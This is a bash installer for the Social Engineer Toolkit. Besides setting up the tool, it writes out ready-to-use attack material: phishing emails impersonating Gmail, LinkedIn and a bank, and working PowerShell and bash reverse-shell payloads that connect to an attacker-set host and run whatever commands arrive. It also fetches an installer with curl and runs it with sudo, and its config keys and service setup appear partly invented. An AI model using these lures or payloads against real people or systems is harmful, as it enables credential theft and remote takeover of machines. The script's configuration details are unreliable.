#!/bin/bash

# Social Engineer Toolkit (SET) Installation Script
# This script installs SET on various Linux distributions

set -e

echo "=== Social Engineer Toolkit (SET) Installation Script ==="
echo "Detecting operating system..."

# Detect OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$NAME
    VER=$VERSION_ID
else
    echo "Cannot detect OS"
    exit 1
fi

echo "Detected OS: $OS $VER"

# Function to install dependencies
install_dependencies() {
    echo "Installing dependencies..."
    
    if [[ "$OS" == *"Ubuntu"* ]] || [[ "$OS" == *"Debian"* ]]; then
        sudo apt update
        sudo apt install -y git python3 python3-pip python3-venv curl wget unzip
        sudo apt install -y build-essential libssl-dev libffi-dev python3-dev
        sudo apt install -y nmap metasploit-framework
    elif [[ "$OS" == *"CentOS"* ]] || [[ "$OS" == *"Red Hat"* ]] || [[ "$OS" == *"Fedora"* ]]; then
        sudo yum update -y
        sudo yum install -y git python3 python3-pip curl wget unzip
        sudo yum install -y gcc openssl-devel libffi-devel python3-devel
        sudo yum install -y nmap
    else
        echo "Unsupported OS: $OS"
        exit 1
    fi
}

# Function to install SET
install_set() {
    echo "Installing Social Engineer Toolkit..."
    
    # Create SET directory
    sudo mkdir -p /opt/set
    cd /opt
    
    # Clone SET repository
    echo "Cloning SET repository..."
    if [ -d "set" ]; then
        sudo rm -rf set
    fi
    
    sudo git clone https://github.com/trustedsec/social-engineer-toolkit.git set
    cd set
    
    # Install SET
    echo "Installing SET..."
    sudo python3 setup.py install
    
    # Create symlinks
    sudo ln -sf /opt/set/setoolkit /usr/local/bin/setoolkit
    sudo ln -sf /opt/set/se-toolkit /usr/local/bin/se-toolkit
    
    # Set permissions
    sudo chown -R $USER:$USER /opt/set
    
    echo "SET installed successfully!"
}

# Function to configure SET
configure_set() {
    echo "Configuring SET..."
    
    # Create SET configuration directory
    mkdir -p ~/.set
    
    # Create basic configuration
    cat > ~/.set/config.set << EOF
# SET Configuration File
# Attack Vector Settings
WEBATTACK_EMAIL=set@yourdomain.com
WEBATTACK_EMAIL_PASSWORD=yourpassword
WEBATTACK_SMTP_SERVER=smtp.gmail.com
WEBATTACK_SMTP_PORT=587

# Payload Settings
PAYLOAD_OPTION=1
PAYLOAD_OPTION_EMAIL=set@yourdomain.com
PAYLOAD_OPTION_SMTP_SERVER=smtp.gmail.com
PAYLOAD_OPTION_SMTP_PORT=587

# Harvester Settings
HARVESTER_EMAIL=set@yourdomain.com
HARVESTER_SMTP_SERVER=smtp.gmail.com
HARVESTER_SMTP_PORT=587

# Mass Mailer Settings
MASSMAILER_EMAIL=set@yourdomain.com
MASSMAILER_SMTP_SERVER=smtp.gmail.com
MASSMAILER_SMTP_PORT=587

# Infectious Media Settings
INFECTIOUS_MEDIA_EMAIL=set@yourdomain.com
INFECTIOUS_MEDIA_SMTP_SERVER=smtp.gmail.com
INFECTIOUS_MEDIA_SMTP_PORT=587

# Arduino Settings
ARDUINO_EMAIL=set@yourdomain.com
ARDUINO_SMTP_SERVER=smtp.gmail.com
ARDUINO_SMTP_PORT=587

# QR Code Settings
QRCODE_EMAIL=set@yourdomain.com
QRCODE_SMTP_SERVER=smtp.gmail.com
QRCODE_SMTP_PORT=587

# PowerShell Settings
POWERSHELL_EMAIL=set@yourdomain.com
POWERSHELL_SMTP_SERVER=smtp.gmail.com
POWERSHELL_SMTP_PORT=587

# Macro Settings
MACRO_EMAIL=set@yourdomain.com
MACRO_SMTP_SERVER=smtp.gmail.com
MACRO_SMTP_PORT=587

# Web Attack Settings
WEBATTACK_SSL=false
WEBATTACK_PORT=80
WEBATTACK_IP=0.0.0.0

# Harvester Settings
HARVESTER_SSL=false
HARVESTER_PORT=80
HARVESTER_IP=0.0.0.0

# Mass Mailer Settings
MASSMAILER_SSL=false
MASSMAILER_PORT=80
MASSMAILER_IP=0.0.0.0

# Infectious Media Settings
INFECTIOUS_MEDIA_SSL=false
INFECTIOUS_MEDIA_PORT=80
INFECTIOUS_MEDIA_IP=0.0.0.0

# Arduino Settings
ARDUINO_SSL=false
ARDUINO_PORT=80
ARDUINO_IP=0.0.0.0

# QR Code Settings
QRCODE_SSL=false
QRCODE_PORT=80
QRCODE_IP=0.0.0.0

# PowerShell Settings
POWERSHELL_SSL=false
POWERSHELL_PORT=80
POWERSHELL_IP=0.0.0.0

# Macro Settings
MACRO_SSL=false
MACRO_PORT=80
MACRO_IP=0.0.0.0
EOF

    echo "SET configuration completed!"
}

# Function to install additional tools
install_additional_tools() {
    echo "Installing additional tools..."
    
    # Install Metasploit Framework (if not already installed)
    if ! command -v msfconsole &> /dev/null; then
        echo "Installing Metasploit Framework..."
        if [[ "$OS" == *"Ubuntu"* ]] || [[ "$OS" == *"Debian"* ]]; then
            curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
            chmod 755 msfinstall
            sudo ./msfinstall
        elif [[ "$OS" == *"CentOS"* ]] || [[ "$OS" == *"Red Hat"* ]] || [[ "$OS" == *"Fedora"* ]]; then
            sudo yum install -y metasploit-framework
        fi
    fi
    
    # Install additional Python packages
    echo "Installing additional Python packages..."
    pip3 install requests beautifulsoup4 lxml
    
    echo "Additional tools installed!"
}

# Function to test installation
test_installation() {
    echo "Testing SET installation..."
    
    if command -v setoolkit &> /dev/null; then
        echo "✓ setoolkit found"
        setoolkit --version
    else
        echo "✗ setoolkit not found"
        return 1
    fi
    
    if command -v se-toolkit &> /dev/null; then
        echo "✓ se-toolkit found"
        se-toolkit --version
    else
        echo "✗ se-toolkit not found"
        return 1
    fi
    
    # Test Python modules
    python3 -c "import set" 2>/dev/null && echo "✓ SET Python module found" || echo "✗ SET Python module not found"
    
    echo "SET installation test completed successfully!"
}

# Function to create desktop shortcut
create_desktop_shortcut() {
    echo "Creating desktop shortcut..."
    
    cat > ~/Desktop/SET.desktop << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=Social Engineer Toolkit
Comment=Social Engineer Toolkit
Exec=/opt/set/setoolkit
Icon=/opt/set/set.ico
Terminal=true
Categories=Security;Development;
EOF

    chmod +x ~/Desktop/SET.desktop
    echo "Desktop shortcut created!"
}

# Function to create systemd service
create_systemd_service() {
    echo "Creating systemd service..."
    
    sudo tee /etc/systemd/system/set.service > /dev/null << EOF
[Unit]
Description=Social Engineer Toolkit
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=/opt/set
ExecStart=/opt/set/setoolkit
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

    sudo systemctl daemon-reload
    sudo systemctl enable set.service
    
    echo "Systemd service created and enabled!"
}

# Function to create attack templates
create_attack_templates() {
    echo "Creating attack templates..."
    
    mkdir -p ~/.set/templates
    
    # Gmail phishing template
    cat > ~/.set/templates/gmail_phishing.txt << EOF
Subject: Gmail Security Alert - Action Required
From: noreply@gmail.com
To: {target_email}

Dear {target_name},

We have detected suspicious activity on your Gmail account. Your account has been temporarily locked for security reasons.

To restore access to your account, please click the link below and verify your identity:

{phishing_url}

This is urgent and must be completed within 24 hours to prevent permanent account suspension.

Best regards,
Gmail Security Team
EOF

    # LinkedIn phishing template
    cat > ~/.set/templates/linkedin_phishing.txt << EOF
Subject: LinkedIn Security Update Required
From: security@linkedin.com
To: {target_email}

Dear {target_name},

We have detected unusual login activity on your LinkedIn account. To protect your account, we need you to verify your identity.

Please click the link below to complete the security verification:

{phishing_url}

This verification must be completed within 2 hours to prevent account suspension.

Best regards,
LinkedIn Security Team
EOF

    # Bank phishing template
    cat > ~/.set/templates/bank_phishing.txt << EOF
Subject: Important: Your Bank Account Has Been Locked
From: security@bank.com
To: {target_email}

Dear {target_name},

We have detected suspicious activity on your bank account. For your security, your account has been temporarily locked.

To restore access to your account, please click the link below and verify your identity:

{phishing_url}

This verification must be completed within 1 hour to prevent permanent account suspension.

Best regards,
Bank Security Team
EOF

    echo "Attack templates created!"
}

# Function to create payload templates
create_payload_templates() {
    echo "Creating payload templates..."
    
    mkdir -p ~/.set/payloads
    
    # Windows payload template
    cat > ~/.set/payloads/windows_payload.ps1 << EOF
# Windows PowerShell Payload Template
# This is a template for Windows payloads

\$client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
\$stream = \$client.GetStream()
\$reader = New-Object System.IO.StreamReader(\$stream)
\$writer = New-Object System.IO.StreamWriter(\$stream)

while(\$true) {
    \$command = \$reader.ReadLine()
    if(\$command -eq "exit") { break }
    
    \$output = Invoke-Expression \$command 2>&1
    \$writer.WriteLine(\$output)
    \$writer.Flush()
}

\$client.Close()
EOF

    # Linux payload template
    cat > ~/.set/payloads/linux_payload.sh << EOF
#!/bin/bash
# Linux Payload Template

while true; do
    exec 3<>/dev/tcp/{lhost}/{lport}
    while read line <&3; do
        if [ "\$line" = "exit" ]; then
            break 2
        fi
        eval "\$line" 2>&1 >&3
    done
    exec 3>&-
    sleep 5
done
EOF

    chmod +x ~/.set/payloads/linux_payload.sh
    echo "Payload templates created!"
}

# Function to create documentation
create_documentation() {
    echo "Creating documentation..."
    
    mkdir -p ~/.set/docs
    
    cat > ~/.set/docs/README.md << EOF
# Social Engineer Toolkit (SET) Documentation

## Overview
The Social Engineer Toolkit (SET) is a penetration testing framework designed for social engineering.

## Installation
SET has been installed to /opt/set

## Usage
- Start SET: setoolkit
- Alternative: se-toolkit

## Attack Vectors
1. Spear-Phishing Attack Vector
2. Web Attack Vector
3. Infectious Media Generator
4. Harvester Attack
5. Mass Mailer Attack
6. Arduino-Based Attack Vector
7. Wireless Access Point Attack
8. QR Code Generator Attack
9. PowerShell Attack Vector
10. Macro Attack Vector

## Configuration
Configuration files are located in ~/.set/

## Templates
Attack templates are located in ~/.set/templates/

## Payloads
Payload templates are located in ~/.set/payloads/

## Security Notice
This tool is for educational and authorized testing purposes only.
EOF

    echo "Documentation created!"
}

# Main installation process
main() {
    echo "Starting Social Engineer Toolkit installation..."
    
    # Check if running as root
    if [ "$EUID" -eq 0 ]; then
        echo "Please do not run this script as root"
        exit 1
    fi
    
    # Install dependencies
    install_dependencies
    
    # Install SET
    install_set
    
    # Configure SET
    configure_set
    
    # Install additional tools
    install_additional_tools
    
    # Create attack templates
    create_attack_templates
    
    # Create payload templates
    create_payload_templates
    
    # Create documentation
    create_documentation
    
    # Create desktop shortcut
    create_desktop_shortcut
    
    # Create systemd service
    create_systemd_service
    
    # Test installation
    test_installation
    
    echo ""
    echo "=== Social Engineer Toolkit Installation Complete ==="
    echo "You can now use the following commands:"
    echo "  setoolkit - Start SET"
    echo "  se-toolkit - Alternative SET command"
    echo ""
    echo "SET is located at: /opt/set"
    echo "Configuration: ~/.set/"
    echo "Templates: ~/.set/templates/"
    echo "Payloads: ~/.set/payloads/"
    echo "Documentation: ~/.set/docs/"
    echo ""
    echo "To start SET, run: setoolkit"
    echo ""
    echo "IMPORTANT: This tool is for educational and authorized testing purposes only."
    echo "Always ensure you have permission before testing on any systems."
}

# Run main function
main "$@" 